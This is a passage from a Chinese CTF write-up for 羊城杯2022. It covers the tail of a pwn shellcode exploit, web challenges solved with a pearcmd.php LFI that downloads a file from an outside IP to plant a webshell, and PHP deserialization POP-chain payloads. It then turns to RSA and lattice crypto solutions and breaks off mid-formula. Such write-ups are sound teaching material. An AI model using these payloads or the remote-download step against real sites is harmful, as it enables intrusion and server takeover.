class="string">&#x27;rsp&#x27;</span>, <span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">shellcode=asm(code)</span><br><span class="line">payload=<span class="built_in">bytes</span>(frame)[<span class="number">0x20</span>:].ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(shellcode_addr+<span class="number">0x28</span>)+shellcode</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">1</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4f0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
<h3 id="rce_me"><a class="markdownIt-Anchor" href="#rce_me"></a> rce_me</h3>
<p>扫进程扫到了这个</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(6).PNG" alt="1280X1280 (6)"></p>
<p>直接读根目录/flag，没有权限，应该是需要连木马提权</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(7).PNG" alt="1280X1280 (7)"></p>
<p>找了一圈死活找不到可以包含的文件，最后要拿pearcmd.php去下载文件然后包含，过滤的字符串可以url编码绕过。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/usr/local/lib/php/%70%65%61%72cmd.php&amp;+download+http://101.43.255.238/1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(8).PNG" alt="img"></p>
<p>下载文件直接到web目录成功</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(9).PNG" alt="img"></p>
<p>包含文件+蚁剑连接+date提权</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(10).PNG" alt="img"></p>
<h3 id="step_by_step-v3"><a class="markdownIt-Anchor" href="#step_by_step-v3"></a> step_by_step-v3</h3>
<p>pop链题目，这里应该是要跳到hint那里去绕过include_once包含文件，但是过滤很多，包含不进去，然后就看到<code>($this-&gt;y1)();</code>可以看phpinfo，结果flag直接出来了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$y</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$y1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;c1=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b1=<span class="variable">$y</span>;</span><br><span class="line"><span class="variable">$y</span>-&gt;y1=<span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line">O:<span class="number">5</span>:<span class="string">&quot;cheng&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;c1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;bei&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;b1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;yang&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;y1&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;phpinfo&quot;</span>;&#125;s:<span class="number">2</span>:<span class="string">&quot;b2&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(11).PNG" alt="1280X1280 (11)"></p>
<h3 id="safepop"><a class="markdownIt-Anchor" href="#safepop"></a> Safepop</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func=[<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;p=<span class="string">&quot;getFlag&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="variable">$f</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot; Fun func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:1:&quot;p&quot;;s:7:&quot;getFlag&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;%00Fun%00func&quot;;a:2:&#123;i:0;O:4:&quot;Test&quot;:0:&#123;&#125;i:1;s:7:&quot;getFlag&quot;;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>这个题一看就是需要去调那个<code>getFlag</code>方法，但是这里<code>preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))</code>看到了过滤说明直接调用肯定是不行的，所以我们是需要通过Fun类的回调函数去调用的，这样就可以绕过过滤。</p>
<p>同时还有个问题就是weakup，看了一眼php版本，php7.3可能是还有绕过，不然这题没法做了。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(12).PNG" alt="1280X1280 (12)"></p>
<p>然后我们就是需要挖链子，这里还有个小问题就是<code>throw new Exception(&quot;no pop&quot;);</code>会抛出异常，绕过他的方式是要让反序列化的内容有错，这里我一直习惯是用数组去改绕过，但是因为这里最后是要改大小绕weakup的所以不用数组也行。这里<code>$b-&gt;p=&quot;getFlag&quot;;</code>也不需要一定赋值<code>getFlag</code>，只要是随便一个B里面没有的方法就行，这里一开始是直接调的Test，所以赋了这个，懒得改了，这里私有方法记得加%00或者url编码一下。还有要改一下B那里改大一点，改成了3.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?pop=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Fun&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00Fun%00func&quot;</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">0</span>:&#123;&#125;i:<span class="number">1</span>;s:<span class="number">7</span>:<span class="string">&quot;getFlag&quot;</span>;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(13).PNG" alt="img"></p>
<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
<h3 id="easyrsa"><a class="markdownIt-Anchor" href="#easyrsa"></a> EasyRsa</h3>
<p>唔，找到一个素数因子，直接分解n。然后就是常规操作，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file  = <span class="string">&quot;D:\\桌面\\CRYPTO附件\\task\\output.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">A = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    n = <span class="built_in">int</span>(i)</span><br><span class="line">    A.append(n)</span><br><span class="line">A = A[::-<span class="number">1</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727</span></span><br><span class="line">p = <span class="number">7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,d,n</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> A:</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="keyword">assert</span> p*q == n</span><br><span class="line">    phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">    d = inverse(e,phi)</span><br><span class="line">    m = decrypt(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">pow</span>(m,e,n)==c)</span><br><span class="line">    c = m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(c))</span><br></pre></td></tr></table></figure>
<h3 id="lrsa"><a class="markdownIt-Anchor" href="#lrsa"></a> <strong>LRSA</strong></h3>
<p>根据</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>58</mn><mo stretchy="false">)</mo><mo>∗</mo><mi>P</mi><mo>+</mo><mi>q</mi><mo>−</mo><mi>t</mi><mo>−</mo><mi>k</mi><mi>Q</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">(p-58)*P+q-t - kQ=0
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord">8</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></span></p>
<p>构造格子</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>P</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>Q</mi></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix}
1 &amp; 0 &amp; P\\ 
0 &amp; 1 &amp; 1\\
0 &amp; 0 &amp; Q
\end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎠</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M457 0 H583 V300 H457 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>我们需要的向量(p-58,q-44,k)量级大概在1024bit，那么需要对我们构造的lattice进行放大</p>
<p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>P</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mn>2</mn><mn>1017</mn></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mn>2</mn><mn>1017</mn></msup><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><annotation encoding="application/x-tex">\begin{pmatrix} 1 &amp; 0 &amp; 2^{1017}P\\  0 &amp; 1 &amp; 2^{1017}\\ 0 &amp; 0 &amp; 2^{1017}Q \end{pmatrix}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.60004em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05002em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎝</span></span></span><span style="top:-3.2550000000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="overlay" style="height:0.3em;width:0.875em;"><svg width="0.875em" height="0.3em" style="width:0.875em" viewbox="0 0 875 300" preserveaspectratio="xMinYMin"><path d="M291 0 H417 V300 H291 z"/></svg></span></span><span style="top:-4.05002em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎛</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span 